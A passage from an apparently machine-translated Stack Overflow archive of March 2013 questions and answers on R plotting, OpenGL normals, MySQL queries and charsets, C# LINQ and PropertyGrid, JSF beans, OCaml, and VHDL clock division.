stripchart(A, method = "stack", offset = .5, at = .15, pch = 19, 
           main = "Dotplot of Random Values", xlab = "Random Values") 
```

![在此处输入图像描述](../Images/3489cb1d536c8ffabb169ae46da0abfe.png)

您还可以`offset`尝试增加堆叠点之间的差距，并`pch`更改点类型。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-06T10:37:50.310

```
library(ggplot2)
ggplot(mtcars, aes(x = mpg)) + geom_dotplot() 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-06T17:15:58.247

仅供参考，这里是 y 轴点图的示例：

```
downv<- data.frame(
y<- c(rep(3,14),6,6,9,9,9,9,9.5,9.5,10.5,10.5,10.5,10.5,rep(11,8)),
l2<- c(rep(8,4),rep(6,6),4,4,8,8,8,4,rep(6,6),8,8,4,4,rep(6,8)),
l<- c(rep(0,7,),rep(1,7),0,1,0,0,1,1,0,1,0,0,1,1,rep(0,4),rep(1,4))
)

ggplot(downv, aes(x = factor(l), y = y, fill = factor(l2))) +
  geom_dotplot(binaxis = "y", stackdir = "center", position = "dodge", dotsize=3,  stackratio = .7) + 
scale_fill_manual(values=c("black", "black", "black"))

#need square aspect ratio 
```

# opengl - glscalef 对法线向量的影响

> ID：15244940
> 
> 赞同：0
> 
> 时间：2013-03-06T10:35:54.630
> 
> 标签：opengl, graphics, rendering, scale, mesh

所以我有一个 .3ds 网格，我导入到我的项目中，它非常大，所以我想使用 glscalef 缩小它的大小。然而，我在着色器中使用的渲染算法使用了法线向量值，因此在缩放后，我的渲染算法不再完全按照应有的方式工作。那么如何补救呢？法线也有 glscalef 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:21:32.377

[法线向量通过模型视图矩阵的转置逆进行变换](http://www.arcsynthesis.org/gltut/Illumination/Tut09%20Normal%20Transformation.html)。然而，第二个约束是，法线具有单位长度并且缩放模型视图会改变它。所以在你的着色器中，你应该应用一个标准化步骤

```
#version 330

uniform mat4x4 MV;
uniform mat4x4 P;
uniform mat4x4 N; // = transpose(inv(MV));

in vec3 vertex_pos;    // vertes position attribute
in vec3 vertex_normal; // vertex normal attribute

out vec3 trf_normal;

void main()
{
    trf_normal = normalize( (N * vec4(vertex_normal, 1)).xyz );
    gl_Position = P * MV * vertex_pos;
} 
```

*注意，“归一化”是将一个向量转化为自己的单位长度的共线向量的过程，与表面法线的概念无关。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T12:20:36.303

要变换法线，您需要将它们乘以**变换矩阵的逆转置**。有几种解释为什么会这样，最好的一种可能是[here](http://www.arcsynthesis.org/gltut/Illumination/Tut09%20Normal%20Transformation.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T12:31:51.663

法线由 MV^IT 转换，模型视图矩阵的反转置，阅读红皮书，它解释了一切。

# mysql - MySQL 查询 - where 子句中的未知列 - 执行 WHERE 子句时可能尚未确定列值

> ID：15244943
> 
> 赞同：0
> 
> 时间：2013-03-06T10:36:09.633
> 
> 标签：mysql

```
 SELECT area_id, 
           area_name,
           (select count(*) from applications
                  where claims_status=1 and 
                    center_name=c.area_id) as cont
    FROM apparea c where cont<>0 
```

我正在尝试从另一个表中获取字段和相关计数，但上述查询不起作用。查询涉及两个不同的表（apparea，applications）。上面的查询有错误，我正在寻找实现此目的的替代方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:39:20.627

您的列的别名在子句`cont`中不可用。`WHERE`您将需要使用与此类似的东西：

```
SELECT area_id, 
  area_name,
  cont
FROM
(
  SELECT area_id, 
    area_name,
    (select count(*) 
     from applications
     where claims_status=1 
     and center_name=c.area_id) as cont
  FROM apparea c
) c 
where cont<>0 
```

这也可以使用 a 来编写`LEFT JOIN`：

```
select c.area_id,
  c.area_name,
  a.cont
from apparea c
left join
(
  select count(*) cont,
    center_name
  from applications
  where claims_status=1 
  group by center_name
) a
  on c.area_id = a.center_name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:40:12.030

试试这个查询

```
SELECT 
     c.area_id,
     c.area_name,
     cnt 
FROM 
     apparea c, 
     (select 
            center_name, 
            count(*) AS cnt 
     from 
            applications
     where 
            claims_status=1 
     GROUP BY 
            center_name
     HAVING 
            count(*) > 0)  cont
where 
     c.area_id = cont.center_name; 
```

获取每个 center_name 的计数，然后加入表以获取每个区域的计数

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:53:27.793

使用`HAVING`而不是`where`.

因为这是`aliases`.

```
It is not permissible to refer to a column alias in a WHERE clause, because the column
value might not yet be determined when the WHERE clause is executed. 
See Section C.5.5.4, “Problems with Column Aliases”. 
```

[http://dev.mysql.com/doc/refman/5.0/en/problems-with-alias.html](http://dev.mysql.com/doc/refman/5.0/en/problems-with-alias.html)

**来自：** [http ://dev.mysql.com/doc/refman/5.0/en/select.html](http://dev.mysql.com/doc/refman/5.0/en/select.html)

# process - 使用 WMI 更改关联（非优先级）进程

> ID：15244947
> 
> 赞同：2
> 
> 时间：2013-03-06T10:36:13.423
> 
> 标签：process, wmi, affinity

在 C# 应用程序和 WMI 中，我尝试更改进程的关联性（如任务管理器）。

我必须为远程计算机执行此操作。`System.Diagnostics`不要那样做。

我没有找到 WMI 课程。有一些类`Win32_NamedJobObjectProcess`，`Win32_NamedJobObjectLimit`或者`Win32_NamedJobObjectLimitSetting`但它似乎是为亲和的工作内核......

可能吗 ？哪些课？在 C#、ps1、vbs...

谢谢你的帮助

# c# - 使用家庭组中的子文件夹

> ID：15244950
> 
> 赞同：1
> 
> 时间：2013-03-06T10:36:16.727
> 
> 标签：c#, .net, asynchronous, windows-8, microsoft-metro

我正在尝试构建一个地铁应用程序，该应用程序应从同一家庭组中的另一台计算机加载图像文件（所有计算机都使用带有工作家庭组的 Windows 8 x64）。我发现的所有示例都不使用子文件夹或使用文件选择器。由于我所有的图像都在同一个文件夹中，并且我知道它们的名称，因此我不想使用文件选择器。我在 appxmanifest 中激活了“图片库”，我可以列出家庭组中的目录/计算机，但我无法打开文件或子文件夹。

这是我所做的：

```
var folder = await Windows.Storage.KnownFolders.HomeGroup.GetFolderAsync("homegroupname");

foreach (var a in await folder.GetFoldersAsync())
{
    Debug.WriteLine(a.Name.ToString());
} 
```

这给了我家庭组的计算机列表（如预期的那样）。

这是我尝试但没有成功的方法：

```
folder = await Windows.Storage.KnownFolders.HomeGroup.GetFolderAsync(@"homegroupname\computername");
folder = await folder.GetFolderAsync(@"computername"); 
```

这些尝试没有奏效，我的想法也用完了。我必须在某处允许该文件夹吗？我打开（子）文件夹的方式是否正确？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T16:42:01.070

我使用以下（几乎是直观的）方法做到了：我为正确类型的文件创建了一个 CommonFileQuery，然后选择具有合适名称的文件。

```
List<string> fileTypeFilter = new List<string>();
fileTypeFilter.Add(".jpg");
fileTypeFilter.Add(".png");
var queryOptions = new QueryOptions(CommonFileQuery.OrderByDate, fileTypeFilter);

var query = KnownFolders.HomeGroup.CreateFileQueryWithOptions(queryOptions);
IReadOnlyList<StorageFile> fileList = await query.GetFilesAsync();
StorageFile file = fileList.FirstOrDefault(x => x.Name == "123_123.jpg"); 
```

# blackberry - Voice Recognition - Speech-to-Text - for BlackBerry OS 7

> ID：15244955
> 
> 赞同：-2
> 
> 时间：2013-03-06T10:36:33.667
> 
> 标签：blackberry, java-me

Is there an API to do Speech-to-Text in BlackBerry OS 7?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:51:31.210

The following link will help you - [iSpeechBlackBerryDemo](http://www.ispeech.org/instructions/sampleprojects/blackberry/instructions.html)

Download the demo code. After register,You received two iSpeech API keys to start speech-enabling your apps. Web Evaluation key and Mobile Production key. Use Mobile Production key to test the demo app.

[iSpeech-Usage-Guidelines](http://www.ispeech.org/downloads/iSpeech-Brand-Usage-Guidelines-2012-04-12.zip)

# jsf - 无法在 JSF 上管理超过 3 个 bean。Mojarra/facelets 无法解析第四个 bean

> ID：15244958
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:36:37.050
> 
> 标签：jsf, netbeans, javabeans, mojarra

我正在使用 netbeans 7.2.1 作为 IDE。我正在尝试开发一个基于 JSF 框架并在 GLASSFISH3+ 服务器上运行的具有各种用户配置文件的多问题选择 Web 应用程序，并且在引入第四个托管 bean 时遇到了问题。所以我对另一个项目进行了测试，使用了 4 个具有相同代码的托管 bean，并具有一个简单的字符串属性。测试豆，测试2豆，测试3豆，测试4豆。这是示例代码：

* * *

```
import javax.faces.bean.ManagedBean; 
import javax.faces.bean.SessionScoped;
@ManagedBean 
@SessionScoped 
public class test3Bean implements java.io.Serializable {
private String s;
public String getS() { 
return s; 
} 
public void setS(String s) {
this.s = s; 
}
} 
```

* * *

Web 应用程序有一个简单的 index.xhtml 读取 4 输入设置为 4 托管 bean：index.xhtml

* * *

输入 testword 1 h:inputText value="#{test1.S}
Enter testword 2 h:inputText value="#{test2.S}
Enter testword 3 h:inputText value="#{test3.S}
Enter testword 4 h: inputText value="#{test4.S}

```
 A submit button 
```

* * *

reponse.xhtml 将显示 4 个输入。

运行应用程序时，出现了undex.xhtml，并且在我在 h:inputText 上输入单词并提交后，我遇到了这个错误：

/index.xhtml @14,107 value="#{test4.s}"：目标无法到达，标识符“test4”解析为空。

我不明白相同的代码 testBean 1,2 和 3 已由 Mojarra/faclets 引擎处理，而不是 test4Bean。

请有任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:14:20.910

您的代码有些混乱。首先，您应该将所有类名的第一个字母大写：

```
import javax.faces.bean.ManagedBean; 
import javax.faces.bean.SessionScoped;
@ManagedBean 
@SessionScoped 
public class Test3Bean implements java.io.Serializable {
  ..
} 
```

必须使用标识符从您的视图中调用此 bean `test3Bean`（注意第一个字母现在是小写的）。bean 属性也必须是小写的。

有了这个，JSF 中的正确输入字段将如下所示：

```
<h:inputText value="#{test3Bean.s} /> 
```

根据这些建议更改您的代码，然后重试。

# c# - 属性网格 > 如何刷新主属性

> ID：15244959
> 
> 赞同：3
> 
> 时间：2013-03-06T10:36:37.537
> 
> 标签：c#, winforms, propertygrid

![在此处输入图像描述](../Images/fe14db74ac31ae3a6f9044a21d59aae4.png)

```
[TypeConverter(typeof(BrokerageConverter))]
[DescriptionAttribute("Brokerage Details")]
[PropertyGridInitialExpanded(true)]
[RefreshProperties(RefreshProperties.Repaint)]
public class Brokerage
{
    private Decimal _Amt = Decimal.Zero; private string _currency = "";

    public Brokerage() { }
    public Brokerage(Decimal broAmount, string broCurrency) { Amount = broAmount; Currency = broCurrency; }

    [ReadOnly(false)]
    public Decimal Amount 
    {
        get { return _Amt; }
        set { _Amt = value; }
    }

    [ReadOnly(true)]
    public string Currency
    {
        get { return _currency; }
        set { _currency = value; }
    }

    //public override string ToString() { return _Amt.ToString() + " - " + _currency; }
}

public class BrokerageConverter : ExpandableObjectConverter
{

    public override bool CanConvertTo(ITypeDescriptorContext context, System.Type destinationType)
    {
        if (destinationType == typeof(Brokerage))
            return true;

        return base.CanConvertTo(context, destinationType);
    }

    public override bool CanConvertFrom(ITypeDescriptorContext context, Type t)
    {
        if (t == typeof(string))
        {
            return true;
        }
        return base.CanConvertFrom(context, t);
    }

    // Overrides the ConvertFrom method of TypeConverter.
    public override object ConvertFrom(ITypeDescriptorContext context,CultureInfo culture, object value)
    {
        if (value is string)
        {
            string[] v = ((string)value).Split(new char[] { '-' });
            return new Brokerage(Decimal.Parse(v[0]), v[1]);
        }
        return base.ConvertFrom(context, culture, value);
    }
    // Overrides the ConvertTo method of TypeConverter.
    public override object ConvertTo(ITypeDescriptorContext context, CultureInfo culture, object value, Type destinationType)
    {
        if (destinationType == typeof(System.String) && value is Brokerage)
        {
            Brokerage b = (Brokerage)value;
            return b.Amount.ToString() + " - " + b.Currency.ToString();
        }
        return base.ConvertTo(context, culture, value, destinationType);
    }
} 
```

现在，当我更改金额时，Buyer Bro 不会自动更新。如何实现？让我知道，如果我必须提供一些额外的信息

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-06-18T08:11:32.563

添加属性“[NotifyParentProperty(true)]”就可以了：

```
[ReadOnly(false)]
[NotifyParentProperty(true)]
public Decimal Amount 
{
    get { return _Amt; }
    set { _Amt = value; }
} 
```

确保添加

```
using System.ComponentModel; 
```

现在，当您更改 Amount 并失去此独特属性的焦点时，父属性将自动更新。干杯!

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T13:42:03.680

我过去也有同样的问题。

我确实 put `[RefreshProperties(RefreshProperties.Repaint)]`or `RefreshProperties.All`，然后我`INotifyPropertyChanged`在我的目标对象上实现了，但我从来没有设法让它的自动机制正常工作。

显然，我[并不](https://stackoverflow.com/questions/3120496/updating-a-propertygrid/4955653#4955653) [孤单](https://stackoverflow.com/questions/6411869/control-is-not-refresh-when-custom-type-property-is-changed)。

我结束了使用`.Refresh()`PropertyGrid 上的方法。现在它一直有效。

```
var b = new Brokerage(10, "EUR");
this.propertyGrid1.SelectedObject = b;

...

b.Amount = 20;
this.propertyGrid1.Refresh(); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-10-26T17:23:17.417

您是否尝试添加，

```
[RefreshProperties(RefreshProperties.Repaint)] 
```

到您的经纪类中的 2 个属性？

# jquery - FancyBox 响应 HTML 内容

> ID：15244962
> 
> 赞同：0
> 
> 时间：2013-03-06T10:36:41.987
> 
> 标签：jquery, ajax, fancybox

在我使用[这个](http://fancybox.net/)之前，我是[fancyBox 2.0](http://diy.stackexchange.com)的新手。我更新了响应式功能的 fancyBox 版本，但它在我的用例中不起作用......我执行了 Ajax 请求，并获得了我想要在我的 fancyBox 中显示的 HTML 尾声。 我就是做这个的 ：

```
$.ajax({
    url: myUrl,
    type:"post",
        data:{
            ...
        },
    dataType: "json",
    success: function(data) {
        if (data.error == 0) {
            $.fancybox.open(data.html,
            {
                type: 'html',
                afterLoad   : function() {
                    ...
                }
            });
        }
    }
}); 
```

并且用这段代码显示的fancyBox没有响应......所以

# c# - 将变音符号插入 MySQL 数据库

> ID：15244963
> 
> 赞同：2
> 
> 时间：2013-03-06T10:36:45.577
> 
> 标签：c#, mysql, .net, diacritics

我有 MySQL 数据库，其中表*MySqlTable*编码为 utf8_slovak_ci，我想通过 C# 代码插入带有变音符号字符（ľščťžýáí...）的字符串。

我正在使用 MySql.Data.MySqlClient 命名空间来允许 MySql 对象。我的 C# 方法：

```
 public void Insert(string sqlQuery, params string[] strings) 
    {
        MySqlCommand command = new MySqlCommand(sqlQuery, connection);

        for (int i = 0; i < strings.Length; i++)
        {
            command.Parameters.Add(new MySqlParameter("@str" + i, strings[i]));
        }

        try
        {
            connection.Open();
            command.ExecuteNonQuery();
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Chyba!", MessageBoxButton.OK, MessageBoxImage.Error);
        }
        finally 
        {
            connection.Close();
        }
    } 
```

从程序中调用此方法：

```
database.Insert(query, newEmployee.Name); 
```

查询在哪里

```
string query = @"INSERT INTO MySqlTable(name) " +
                        "VALUES(@str0)"; 
```

问题出在哪里......当我尝试插入一些包含特殊字符（fe *Anča*）的字符串时，它会像*Anca*一样保存在数据库中。但是当我通过 phpmyadmin 执行相应的 INSERT 查询时，它被正确保存。问题字符只是*ľčťďň*（保存为*lctdn*），其他字符（如*šžýáíéúäô*保存好）。有谁知道哪里有问题？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-15T18:40:51.703

在连接字符串中指定“charset=utf8;”。例如：“Datasource=192.168.48.128;Database=something;uid=user;pwd=password;charset=utf8;”

当然，将表格的字符集设置为 utf-8 并将排序规则设置为斯洛伐克语变体。

为匈牙利语工作。

学分：[在 MySql 中读/写 unicode 数据](https://stackoverflow.com/questions/1385994/read-write-unicode-data-in-mysql)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-09-23T13:28:22.840

等效于 mysql 命令行工具的是**--default-character-set**参数。例如：

```
mysql -h host -u user -ppass --default-character-set=utf8
mysql> source make_db.sql 
```

其中 make_db.sql 是 utf 中的 sql 脚本（带有变音符号）。

# eclipse - PyDev 重写了我的 .pydevproject

> ID：15244968
> 
> 赞同：0
> 
> 时间：2013-03-06T10:36:54.117
> 
> 标签：eclipse, pydev

日食 - 3.7

派德夫 - 2.6

我为 Eclipse 使用 PyDev，我的项目有几个依赖项。我不想使用 UI 手动将它们添加到 PyDev **。**相反，我有一个打印的脚本

```
<path>...library...</path> 
```

当我编辑 .pyproject 并添加这些元素时，eclipse 似乎将项目重新同步为“资源不同步”，当我刷新时，我得到了空的 .pyproject 文件。

但它只发生在一个项目中。为什么会发生这种情况以及如何手动编辑它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T16:16:35.900

好吧，这完全是我的错。赠品是这只发生在一个项目中。我为生成 .pydev 项目文件而创建的脚本是无效的 XML 文件（缺少一些结束片段）

也许我们可以有一个功能来检查给定的 xml 是否有效并提醒用户。“资源不同步”消息根本没有说明这一点

# asp.net - 网络安全问题？

> ID：15244973
> 
> 赞同：0
> 
> 时间：2013-03-06T10:37:00.730
> 
> 标签：asp.net, security, web

我的团队被要求“增强”一个网络应用程序以允许以下操作。这是否被视为 Web 应用程序中的安全风险？我不确定。

“能够访问目录，用于在虚拟目录之外导出和导入[数据到数据库]”

换句话说，请求者希望能够导航到应用程序的 IIS 虚拟目录之外的任何地方的数据文件，大概是在导入（或导出）数据时。

我认为这意味着在 Web 服务器上，但它可能意味着客户端计算机上的本地文件（待澄清）。但无论哪种方式，问题都存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T14:10:59.937

如果您谈论的是超出 Web 应用程序的边界，那就意味着有风险。一旦您允许特定用户超越您的 Web 应用程序，就无法再控制该用户对 Web 服务器的操作。

看看路径遍历攻击：

[https://www.owasp.org/index.php/Path_Traversal](https://www.owasp.org/index.php/Path_Traversal)

此外，为了避免这种情况，这里列出了需要考虑的事项：

[https://www.owasp.org/index.php/File_System#Path_traversal](https://www.owasp.org/index.php/File_System#Path_traversal)

有任何问题，请告诉我。

问候，法比奥@fcerullo

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:06:17.953

这个问题不是“无论如何”。他们是不同的问题。如果是关于能够从本地计算机中选择一个文件发送到远程服务器，那么这是非常常规的。例如，在将文件附加到电子邮件时一直这样做。用户是发起文件选择的人，并且这是他们要发送到 Web 应用程序的文件。这里没有安全漏洞。

如果您需要允许客户端能够浏览服务器计算机以查找各种文件，那么这本身并不是一个安全漏洞。这就是你想要的，你得到了。仅当您并不意味着客户端应该能够从服务器上的任何目录中获取文件时，这才是安全漏洞。这整个场景被归类为安全问题，因为您通常不希望客户端访问服务器上的所有包含文件。通常，客户端只需要能够访问某些文件。将您限制在虚拟目录中是一种方法。例如，您是否希望您的客户能够获取包含您网站所有用户记录的实际数据库文件，然后将该数据库文件加载到他们自己的数据库中？

如果您需要超出此范围，则需要实施仅允许访问某些文件的机制。请记住，您的 Web 服务器是在服务器操作系统上的某个用户的上下文中运行的。当客户端请求到达服务器时，它是执行命令的 Web 服务器用户。因此，您无法通过简单地为该 Web 服务器用户设置权限来实现安全性。

# ocaml - OCaml：在命令式代码中丢弃返回值

> ID：15244975
> 
> 赞同：5
> 
> 时间：2013-03-06T10:37:02.237
> 
> 标签：ocaml, imperative-programming

我如何成功地丢弃函数的返回值并将其视为返回单元（显然是为了副作用）。显而易见的方法是这样做：

```
let foo = begin
  some_ignored_thing ();
  actual_return
end 
```

但是，编译器抱怨（带有警告）返​​回类型`some_ignored_thing`不是单位。

我可以发明自己的方法，例如：

```
let ignore a = () 
```

这似乎至少简洁并标记了正在发生的事情，但是语言/标准库中是否有任何东西可以实现相同的目标？我原以为这将是一个相对常见的用例。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-06T11:12:39.393

确实，有一个`ignore : 'a -> unit`函数可以做到这一点。

编译器实际上知道`ignore`并硬编码通常非常有用的特定行为，但有时可能会带来不便：默认情况下，忽略函数（任何具有 form 类型的函数`foo -> bar`）会引发警告。

原因是忘记添加函数的最后一个参数是一个相对常见的错误。你可以写例如

```
ignore (List.map (fun x -> foo bar)) 
```

当你打算写

```
ignore (List.map (fun x -> foo bar) li) 
```

而您期望看到的效果不是。

因此`ignore`在这种情况下会发出警告，而您的手动编码`let ignore x = ()`不会这样做。人们有时也会写

```
let _ = foo in ... 
```

忽略`foo`，但这也有同样的缺点（很容易弄错类型实际上是什么）。Kakadu 建议在那里使用类型注释，这是一个合理的建议。

（有些人还使用`let _ = ...`他们程序的“主要”表达式。我建议宁愿使用`let () = ...`它，因为它强制更高的类型精度。）

最后，有些人更喜欢使用`let _ = ...`表单，因为他们处于使用`;`会迫使他们添加括号或的情况`begin..end`。我建议您始终添加括号或`begin..end`在这些情况下，因为使用它很容易使自己陷入困境 -`if..then..else..`例如模糊的优先规则。

# c# - 使用 Linq 从嵌套集合中选择对象

> ID：15244988
> 
> 赞同：9
> 
> 时间：2013-03-06T10:37:34.903
> 
> 标签：c#, linq

我有一个类似这样的类结构：

```
class MyClass
{
    public IEnumerable<AttributeGroup> AttributeGroups { get; set; }
}

class AttributeGroup
{
    public IEnumerable<Attribute> Attributes { get; set; }
}

class Attribute
{
    public string SomeProp { get; set; }
} 
```

无论它们属于哪个属性组，我都需要获取所有具有特定“SomeProp”值的“属性”。

例如，`SomeProperty== 'A'`可以在两者中找到，`MyClassObj.AttributeGroup[0]`并且`MyClassObj.AttributeGroup[5]`我需要编写一个 Linq（或类似的东西）来从这两个不同的属性组中获取两个对象。

有什么建议吗？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-06T10:40:57.440

首先从所有属性组中选择所有属性，然后仅选择具有您的属性的属性。

```
IEnumerable<Attribute> attributes =
    myClassInstance
        .AttributeGroups
        .SelectMany(x => x.Attributes)
        .Where(x => x.SomeProperty == 'A'); 
```

其他 Linq 风格的语法：

```
IEnumerable<Attribute> attributes =
    from attributeGroup in myClassInstance.AttributeGroups
    from attribute in attributeGroup.Attributes
    where attribute.SomeProperty == 'A'
    select attribute; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T10:51:26.497

看看 SelectMany ( [http://msdn.microsoft.com/en-us/library/bb534336.aspx](http://msdn.microsoft.com/en-us/library/bb534336.aspx) )。

例如：

```
myClassObjs.SelectMany(o => o.AttributeGroups.SelectMany(g => g.Attributes)).Where(a => a.SomeProp == "A") 
```

此行选择 SomeProp 等于“A”的所有 MyClass 对象的所有 AttributeGroups 的所有 Attribute 对象。Where 的 lambda 表达式中的 a 是 Attribute 类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:42:29.263

你的例子不清楚；我不知道您所说的“来自这两个不同属性组的两个对象”是什么意思。我猜您想要具有相关属性的属性的组：

```
from g in MyClassObj.AttributeGroups
where g.Any(attr => attr.SomeProperty == "A")
select g 
```

# mysql - 结合唯一值的 SQL 查询结果

> ID：15244991
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:37:37.537
> 
> 标签：mysql, sql, join

这是我的查询：

```
SELECT DISTINCT  star_user.name_user, star_group.name_group,   star_addresses.email 
FROM star_addresses

JOIN star_user_group
ON star_user_group.id_user_groupu = star_addresses.user_id

JOIN star_group
ON star_group.id_group = star_user_group.id_group_groupu

JOIN star_user
ON star_user.corespondence_user = star_addresses.id_address

JOIN star_news_group
ON star_news_group.groupid_newsg = star_user_group.id_group_groupu

WHERE newsid_newsg = 5; 
```

运行上述查询后，我得到以下输出：

```
name_user|name_group|email
Zuma     |A         |abc@zz.com
Rafe     |B         |xyz@nn.com
Adam     |D         |aaa@bb.com
Zuma     |B         |abc@zz.com
Zuma     |C         |abc@zz.com 
```

我希望拥有的不是 Zuma 的重复值，例如她的 name_user 和电子邮件：

```
name_user|name_group|email
Zuma     |A,B,C     |abc@zz.com 
```

那么，如何获得呢？非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:51:58.823

在 MySQL 中，使用`GROUP_CONCAT`

```
SELECT  star_user.name_user, 
        GROUP_CONCAT(DISTINCT star_group.name_group) name_group,   
        GROUP_CONCAT(DISTINCT star_addresses.email) email
FROM    star_addresses
        JOIN star_user_group
            ON star_user_group.id_user_groupu = star_addresses.user_id
        JOIN star_group
            ON star_group.id_group = star_user_group.id_group_groupu
        JOIN star_user
            ON star_user.corespondence_user = star_addresses.id_address
        JOIN star_news_group
            ON star_news_group.groupid_newsg = star_user_group.id_group_groupu
WHERE   newsid_newsg = 5;
GROUP   BY star_user.name_user 
```

# vhdl - VHDL：基于非常快的时钟创建非常慢的时钟脉冲

> ID：15244992
> 
> 赞同：7
> 
> 时间：2013-03-06T10:37:39.490
> 
> 标签：vhdl, clock, fpga

*（我会在 EE 中发布此内容，但似乎这里有更多 VHDL 问题......）*

**背景：**我将 Xilinx Spartan-6LX9 FPGA 与 Xilinx ISE 14.4 (webpack) 一起使用。

今天我偶然发现了可怕的“PhysDesignRules:372 - 门控时钟”警告，我看到有很多关于这个的讨论。共识似乎是使用 FPGA 上的 DCM 之一进行时钟分频，但是......我的 DCM 似乎无法从 32 MHz 变为 4.096 KHz（根据向导，它在 5MHz 时触底32MHz ......而且为了这个低频目的而尝试链接多个 DCM 似乎很荒谬）。

我当前的设计使用 clk_in 计数到指定值 (15265)，将该值重置为零并切换 clk_out 位（因此我最终得到 50% 的占空比，FWIW）。它完成了这项工作，我可以轻松地使用 clk_out 的上升沿来驱动我设计的下一阶段。它似乎工作得很好，但是......*门控时钟*（即使它不在恕我直言时钟偏差非常相关的范围内）。（注意：所有时钟测试都是在对给定时钟敏感的进程中使用rising_edge() 函数完成的。）

所以，我的问题：

*   如果我们谈论从*更快*的 clk_in 派生相对较慢的clk_out，门控仍然被认为是坏的吗？**或者这种“计数到 x 并发送脉冲”*对于 FPGA*来说是非常典型的，以在 KHz 范围内生成“时钟”，而其他一些不必要的副作用可能会触发这个警告？**

*   有没有更好的方法可以从 MHz 范围的主时钟创建一个低 KHz 范围的时钟，请记住，在这里使用多个 DCM 似乎是过大的（如果考虑到非常低的输出频率可能的话）？我意识到 50% 的占空比可能是多余的，但假设一个时钟输入*而不*使用板载 DCM，否则如何使用 FPGA 执行主要时钟分频？

编辑：鉴于以下情况（其中 CLK_MASTER 是 32 MHz 输入时钟，CLK_SLOW 是所需的慢速时钟，而 LOCAL_CLK_SLOW 是存储整个占空比事物的时钟状态的一种方式），我了解到这种配置导致警告：

```
architecture arch of clock is
    constant CLK_MASTER_FREQ: natural := 32000000; -- time := 31.25 ns
    constant CLK_SLOW_FREQ: natural := 2048;
    constant MAX_COUNT: natural := CLK_MASTER_FREQ/CLK_SLOW_FREQ;
    shared variable counter: natural := 0;
    signal LOCAL_CLK_SLOW: STD_LOGIC := '0';
begin
    clock_proc: process(CLK_MASTER)
    begin
        if rising_edge(CLK_MASTER) then
            counter := counter + 1;
            if (counter >= MAX_COUNT) then
                counter := 0;
                LOCAL_CLK_SLOW <= not LOCAL_CLK_SLOW;
                CLK_SLOW <= LOCAL_CLK_SLOW;
            end if;
        end if;
    end process;
end arch; 
```

而此配置不会导致警告：

```
architecture arch of clock is
    constant CLK_MASTER_FREQ: natural := 32000000; -- time := 31.25 ns
    constant CLK_SLOW_FREQ: natural := 2048;
    constant MAX_COUNT: natural := CLK_MASTER_FREQ/CLK_SLOW_FREQ;
    shared variable counter: natural := 0;
begin
    clock_proc: process(CLK_MASTER)
    begin
        if rising_edge(CLK_MASTER) then
            counter := counter + 1;
            if (counter >= MAX_COUNT) then
                counter := 0;
                CLK_SLOW <= '1';
            else
                CLK_SLOW <= '0';
            end if;
        end if;
    end process;
end arch; 
```

因此，在这种情况下，这完全是因为缺少 else （就像我说的，50% 占空比最初很有趣，但最终不是必需的，并且“本地”时钟位的切换似乎很聪明时间......）我大部分时间都在正确的轨道上。

**在这一点上我不清楚的是为什么使用计数器（存储大量位）不会导致警告，但存储和切换输出位*会*导致警告。**想法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-06T10:50:55.623

如果您只需要一个时钟来驱动 FPGA 中逻辑的另一部分，那么简单的答案就是使用时钟使能。

也就是说，在与其他所有东西相同的（快速）时钟上运行您的慢速逻辑，但使用慢速启用它。例子：

```
signal clk_enable_200kHz  : std_logic;
signal clk_enable_counter : std_logic_vector(9 downto 0);

--Create the clock enable:
process(clk_200MHz)
begin
  if(rising_edge(clk_200MHz)) then
    clk_enable_counter <= clk_enable_counter + 1;
    if(clk_enable_counter = 0) then
      clk_enable_200kHz <= '1';
    else
      clk_enable_200kHz <= '0';
    end if;
  end if;
end process;

--Slow process:
process(clk_200MHz)
begin
  if(rising_edge(clk_200MHz)) then
    if(reset = '1') then
      --Do reset
    elsif(clk_enable_200kHz = '1') then
      --Do stuff
    end if;
  end if;
end process; 
```

虽然 200kHz 是近似值，但以上基本上可以扩展到您需要的任何时钟使能频率。此外，大多数 FPGA 中的 FPGA 硬件应该直接支持它（至少在 Xilinx 部件中）。

门控时钟几乎总是一个坏主意，因为人们经常忘记他们正在创建新的时钟域，因此在它们之间连接信号时没有采取必要的预防措施。它还在 FPGA 内部使用了更多的时钟线，因此如果您有很多门控时钟，您可能会很快用完所有可用的线。

时钟使能没有这些缺点。一切都在相同的时钟域中运行（尽管速度不同），因此您可以轻松使用相同的信号，而无需任何同步器或类似设备。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-08-20T17:49:32.170

注意这个例子在这条线上工作，

信号 clk_enable_counter : std_logic_vector(9 down to 0);

必须改为

信号 clk_enable_counter : unsigned(9 down to 0);

你需要包含这个库，

